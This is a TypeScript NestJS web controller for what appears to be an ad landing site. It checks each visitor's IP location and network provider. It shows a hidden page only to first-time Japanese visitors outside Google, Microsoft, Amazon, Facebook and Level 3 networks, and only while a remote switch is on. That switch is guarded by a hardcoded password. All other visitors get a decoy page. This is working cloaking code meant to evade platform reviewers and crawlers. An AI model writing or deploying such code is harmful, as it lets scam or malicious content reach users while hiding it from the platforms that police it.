import { Controller, Get, Post, Req, Res } from '@nestjs/common';
import axios from 'axios';
import { Request, Response } from 'express';
import { join } from 'path';

// import { Cron, CronExpression } from '@nestjs/schedule';

@Controller()
export class AppController {
  updateConst = false;

  constructor() {}

  @Get('hello')
  getHello(): string {
    console.log('hello');
    return 'Hello World!';
  }

  // @Cron(CronExpression.EVERY_30_SECONDS)
  // async continueRequest() {
  //   await axios('https://breatheease.onrender.com/hello');
  // }

  @Get('/getConst')
  getConst(@Res() res: Response) {
    res.status(200).send(this.updateConst);
  }

  @Post('/updateConst')
  updateConstFun(@Res() res: Response, @Req() req: Request) {
    if (req.body['password'] === 'Jonny') {
      this.updateConst = req.body['value'];
    }
    res.send(this.updateConst);
  }

  async getIpInfo(ip: string) {
    try {
      const response = await axios.get(`http://ip-api.com/json/${ip}`);
      return response.data;
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
    } catch (error) {
      return { error: 'Unable to fetch IP info' };
    }
  }

  @Get()
  async homePage(@Res() res: Response, @Req() req: Request) {
    // Get real client IP from headers
    const forwarded = req.headers['x-forwarded-for'];
    const realIp = Array.isArray(forwarded)
      ? forwarded[0]
      : forwarded?.split(',')[0] || req.ip;

    const xx = await this.getIpInfo(realIp);
    const myToken = req.cookies['g-set-id'];
    console.log(
      'ip-',
      realIp,
      'ipInfo-',
      {
        countryCode: xx.countryCode,
        regionName: xx.regionName,
        isp: xx.isp,
        org: xx.org,
        as: xx.as,
      },
      'g-set-token-',
      myToken,
      'const-',
      this.updateConst,
    );
    const isJapan = xx.countryCode === 'JP';
    const isAllowedISP = !(
      xx.isp === 'Level 3 Communications, Inc.' ||
      xx.as === 'AS3356 Level 3 Parent, LLC' ||
      xx.isp === 'Microsoft Corporation' ||
      xx.as === 'AS8075 Microsoft Corporation' ||
      xx.isp === 'Amazon.com, Inc.' ||
      xx.as === 'AS16509 Amazon.com, Inc.' ||
      xx.isp === 'Google LLC' ||
      xx.as === 'AS15169 Google LLC' ||
      xx.as === 'AS396982 Google LLC' ||
      xx.isp === 'Facebook, Inc.' ||
      xx.as === 'AS32934 Facebook, Inc.'
    );
    const isValidToken =
      myToken !== 'e8ce6d0d4a1ff777acb245378e2febd08126b0e9e9eed50f2b';

    if (isJapan && this.updateConst && isAllowedISP && isValidToken) {
      console.log('if');
      res.cookie(
        'g-set-id',
        'e8ce6d0d4a1ff777acb245378e2febd08126b0e9e9eed50f2b',
        {
          httpOnly: true, // secure: true in production with HTTPS
          maxAge: 1000 * 60 * 60 * 24 * 30, // 1 month
        },
      );
      res
        .status(200)
        .sendFile(join(__dirname, '..', 'src', 'files', 'new.html'));
    } else {
      console.log('else');
      res
        .status(200)
        .sendFile(join(__dirname, '..', 'src', 'files', 'index.html'));
    }
  }

  @Get('/landers/mp_jp_adult/ABR/index.php')
  async homePage2(@Res() res: Response) {
    res
      .status(200)
      .sendFile(join(__dirname, '..', 'src', 'files', 'index.html'));
  }
}
